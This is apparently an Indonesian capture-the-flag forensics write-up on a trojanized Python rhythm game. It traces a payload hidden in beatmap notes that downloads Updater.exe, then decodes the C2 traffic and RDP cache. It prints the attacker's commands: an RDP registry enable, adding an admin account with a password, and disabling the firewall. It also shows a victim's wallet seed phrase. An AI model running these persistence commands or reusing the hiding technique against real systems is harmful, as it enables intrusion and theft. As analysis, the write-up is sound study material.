# Tsuki's Rhythm Game

Artefak yang dikasih ada tiga jalur penting:

1. `Game.zip` berisi game Python yang dibungkus PyInstaller.
2. `traffic.pcapng` berisi download game, stage-2 malware, dan sesi C2.
3. `Evidence.zip` berisi cache bitmap RDP dari mesin attacker.

## Ringkasannya

`advanced_stats.tsukimod` ternyata bukan mod statistik biasa. Mod ini ngambil note dengan `type == 99` dari beatmap `Eggdrasil.tsuki`, nyusun bitstream, lalu `marshal.loads()` hasilnya jadi bytecode Python tersembunyi. Bytecode itu download `Updater.exe` dari `http://192.168.117.1:8000/Updater.exe` lalu ngejalanin file tersebut.

`TsukiRhythmGame.exe` masih gampang dibedah karena isinya PyInstaller. Dari `main` bisa diambil key AES beatmap:

- Key: `TsukiRhythmKey!!`
- IV: `TsukiRhythmIV!!!`

Beatmap `Eggdrasil.tsuki` bisa didecrypt pakai key itu, lalu payload tersembunyi dari note `type == 99` punya MD5:

`aed1e4e8b9061e19506848ca579e46ac`

## C2 `Updater.exe`

Reverse `Updater.exe` nunjukkin dua hal penting:

1. Port C2 yang dituju: `4444`
2. File lokal yang dipakai buat material komunikasi: `C:\Windows\hh.exe`

Pesan pertama klien ke server adalah isi `hh.exe` yang di-XOR dengan key berulang `13 37 c0 de`. Setelah dibalik, file itu valid PE dan MD5-nya:

`2c8fe78d53c8ca27523a71dfd2938241`

Command berikutnya di channel C2 dikodekan sebagai angka bertitik. Setelah map byte dibangun dari `hh.exe` dan layer AES dibuka, command attacker jadi jelas:

1. `ipconfig /all`
2. `whoami`
3. `dir`
4. `tasklist`
5. `REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f`
6. `net user aurahack P@ssw0rd /add`
7. `net localgroup Administrators aurahack /add`
8. `netsh firewall set opmode disable`

Output `whoami` dari host korban:

`desktop-gb98l3m\tsuki`

## `Evidence.zip`

Quiz ngasih password ZIP:

`18ae3a54-1c1a-4f44-adca-9884acb80d9a`

Isinya `Cache0000.bin`, format cache bitmap RDP (`RDP8bmp`). File ini bisa diparse sebagai:

- header global 12 byte
- record berulang `12-byte header + 64x64 BGRA tile`

Tile-tile itu cukup buat bikin contact sheet. Dari situ kelihatan jendela MetaMask recovery phrase. Seed phrase korban:

`labor trophy emerge material divorce input faint bench cricket merge sunset cream`

Kata ke-7:

`faint`

Alamat Ethereum default MetaMask (`m/44'/60'/0'/0/0`) dari seed itu:

`0x27A2481a2D840C64c1f6a99842E1A63A1586237e`

## Flag

`r3ctf{FIN4lIY-YoU-F1ND-tHE-sECRet-beH1ND-rHYThm-AnD-tRACE_them0}`
